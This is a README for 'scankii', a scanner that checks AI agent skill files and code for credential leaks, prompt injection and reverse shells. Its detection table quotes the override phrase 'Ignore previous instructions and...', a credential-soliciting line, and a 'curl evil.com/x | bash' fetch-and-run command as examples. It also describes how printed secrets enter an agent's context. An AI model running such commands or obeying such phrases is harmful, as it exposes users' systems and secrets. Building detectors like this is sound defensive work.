<div align="center">
  
# 🛡️ Scankii

[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/ashishp05)

**A fast, local-first static security scanner built exclusively for AI Agents and the tools they use.**

</div>

---

### ❓ What does it do?
When you build or use an AI Agent (like a custom ChatGPT bot or AutoGen agent), you give it "skills" or "tools." A skill is simply a combination of **Python code** and **English instructions**.

Standard security scanners only check your code. But what if your English instructions accidentally tell the AI to print or expose a secret password? 

`scankii` solves this by reading **both your English instructions and your Python code at the same time**. It spots dangerous cross-modal interactions where the prompt tricks the code into giving away your API keys.

---

## 📑 Table of Contents
- [✨ What does it work with?](#-what-does-it-work-with)
- [⚠️ The Problem: Cross-Modal Leakage](#️-the-problem-cross-modal-leakage)
- [⚙️ How scankii works](#️-how-scankii-works)
- [🚀 Demo](#-demo)
- [📦 Install & Usage](#-install--usage)
- [🛡️ What It Detects](#️-what-it-detects)
- [⚔️ Why Not TruffleHog / GitLeaks?](#️-why-not-trufflehog--gitleaks)
- [🔌 Enterprise Integrations](#-enterprise-integrations)
- [🤝 Contributing & Support](#-contributing--support)

---

## ✨ What does it work with?

`scankii` is framework-agnostic. It analyzes your raw Python code and Markdown text, which means it works seamlessly with any AI architecture or ecosystem:

- 🤖 **Agent Frameworks:** LangChain, AutoGen, CrewAI, Semantic Kernel, LlamaIndex, Model Context Protocol (MCP).
- 💻 **AI Coding Assistants:** Cursor IDE, Google Antigravity, Claude Code (scan your `.cursorrules`).
- 🧠 **LLMs:** OpenAI GPT-4, Claude 3.5, Gemini, Llama 3 (leaks happen in the execution layer!).
- 🛠 **IDEs:** Because `scankii` exports standard SARIF reports, you can view the security warnings natively inside VS Code, Cursor, or GitHub Advanced Security.

---

## ⚠️ The Problem: Cross-Modal Leakage

In modern LLM agent architectures, agents read natural language instructions and execute code. This creates a unique vulnerability:

1. 🟢 **The Code is "Safe":** The source code might securely read an API key from the environment.
2. 🟢 **The Markdown is "Safe":** The `SKILL.md` might benignly explain how to use the skill.
3. 🔴 **The Intersection is Vulnerable:** If the `SKILL.md` instructs the agent to pass a credential to a function, and that function prints it for debugging, the agent framework captures that `stdout` and injects it back into the LLM context window. The secret is now exposed!

`scankii` correlates natural language prompts with Abstract Syntax Tree (AST) analysis to catch these data leaks before your agent hits production.

---

## ⚙️ How scankii works

`scankii` employs a dual-engine static analysis pipeline.

```mermaid
graph TD
    subgraph "scankii Pipeline"
        direction TB
        
        subgraph "1. Static Analysis"
            A[SKILL.md] -->|Natural Language| B[NL Semantic Analyzer]
            C[Source Code] -->|AST Parsing| D[AST Syntax Analyzer]
        end
        
        subgraph "2. Cross-Modal Correlation"
            B -->|Extracted Intents| E{Cross-Modal Engine}
            D -->|Variable Sinks| E
        end
        
        subgraph "3. Scoring & Reporting"
            E -->|Unmatched Findings| F[Scorer]
            E -->|Correlated Leaks| F
            F -->|Severity Assessment| G[Reporters]
        end
    end
    
    G --> H((Terminal UI))
    G --> I((JSON))
    G --> J((SARIF))
```

---

## 🚀 Demo

```text
$ scankii scan examples/vulnerable-skill --explain

┏━━━━━━━━┳━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━┓
┃ File   ┃ Line ┃ Pattern          ┃ Channel ┃ Severity ┃
┡━━━━━━━━┇━━━━━━┇━━━━━━━━━━━━━━━━━━┇━━━━━━━━━┇━━━━━━━━━━┩
│ run.py │    7 │ Cross-Modal Leak │ stdout  │  MEDIUM  │
│ run.py │    8 │ Cross-Modal Leak │ network │ CRITICAL │
└────────┴──────┴──────────────────┴─────────┴──────────┘

  Total: 2  (CRITICAL: 1, MEDIUM: 1)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 CRITICAL — Information Exposure via network
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Pattern:   Information Exposure
Channel:   network
File:      run.py, line 8
Score:     5.04

  Attack Flow:
    print(f"Using key: {api_key}")  ← sinks to stdout
    ↓
    stdout ← captured by agent framework
    ↓
    LLM context window ← credential queryable via natural language
```

---

## 📦 Install & Usage

**Install via pip:**
```bash
pip install scankii
```

**Run locally:**
Your code and proprietary agent skills never leave your machine!
```bash
# Scan a directory
scankii scan ./my-skill/

# Scan with detailed attack explanations
scankii scan ./my-skill/ --explain

# Export to JSON
scankii scan ./my-skill/ --format json

# Export to SARIF (GitHub Advanced Security)
scankii scan ./my-skill/ --format sarif

# Auto-Fix Vulnerabilities
scankii scan ./my-skill/ --resolve
```

---

## 🛡️ What It Detects

| # | Pattern | Description | Example |
|---|---------|-------------|---------|
| 1 | **Hardcoded API Keys** | OpenAI, Groq, AWS, GitHub, Google keys | `API_KEY = "sk-proj-..."` |
| 2 | **Credential-to-Stdout** | Credentials passed to `print()` | `print(f"key={api_key}")` |
| 3 | **Credential-to-Network** | Credentials sent via `requests.post()` | `requests.post(url, data=token)` |
| 4 | **Cross-Modal Leak** | SKILL.md passes credential to code sink | NL says "pass api_key" + code prints it |
| 5 | **Prompt Injection** | NL instructions to override safety | "Ignore previous instructions and..." |
| 6 | **Social Engineering** | Soliciting credentials from users | "Paste your API key here" |
| 7 | **Private Key Exposure** | RSA/EC private key blocks | `-----BEGIN RSA PRIVATE KEY-----` |
| 8 | **Reverse Shell / RCE** | Reverse shells, `curl \| bash` | `curl evil.com/x \| bash` |
| 9 | **Nested Schema Poisoning** | Prompt injections in JSON schema | *CVE-2026-25253* |
| 10 | **MCP Supply-Chain** | Base64/Hex hidden payloads | *CVE-006* |
| 11 | **Dynamic Execution** | Network fetch-execute patterns | *CVE-007* |
| 12 | **Authority Boundary** | Financial hops requiring witness | ⏳ `DEFER` severity |

### ⏳ The `DEFER` Severity State
Not all vulnerabilities can be statically resolved. When `scankii` detects an **Authority Boundary** (e.g., an agent negotiating a financial hop with a spend cap and recipient), it flags it with a special `DEFER` severity (marked in cyan ⏳). This tells the developer: *"This pattern is statically well-formed, but it requires a runtime witness to prove the mandate."*

---

## ⚔️ Why Not TruffleHog / GitLeaks?

Existing tools scan your code for static secrets. `scankii` is purpose-built for LLM agents, focusing on the intersection of natural language and code.

| Feature | TruffleHog | GitLeaks | **scankii** |
|---------|-----------|----------|-------------|
| Regex secret scanning | ✅ | ✅ | ✅ |
| SKILL.md NL analysis | ❌ | ❌ | ✅ |
| Cross-modal detection | ❌ | ❌ | ✅ |
| AST-based sink tracking | ❌ | ❌ | ✅ |
| Attack flow visualization | ❌ | ❌ | ✅ |
| Prompt injection detection | ❌ | ❌ | ✅ |

---

## 🔌 Enterprise Integrations

### GitHub Action
Upload results directly to GitHub Code Scanning on every PR:
```yaml
name: Skill Guard
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: scankii/scankii@v1
        with:
          path: ./skills/
          sarif-upload: true
```

### Pre-commit Hook
Stop secrets from being committed locally:
```yaml
repos:
  - repo: https://github.com/ashp15205/scankii
    rev: v1.2.2
    hooks:
      - id: scankii
```

---

## 🤝 Contributing & Support

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/my-feature`
3. Run tests: `pytest tests/ -v`
4. Submit a pull request!

### Academic Origins
The 10-pattern leakage taxonomy is based on the empirical research in:
> *Chen et al., "How Your Credentials Are Leaked by LLM Agent Skills: An Empirical Study" (ASE 2026).*

### Support the Project
If you find `scankii` useful, consider buying me a coffee! ☕️<br>
<a href="https://buymeacoffee.com/ashishp05" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 40px !important;width: 145px !important;" ></a>

<p align="center">
  <i>Released under the MIT License.</i>
</p>
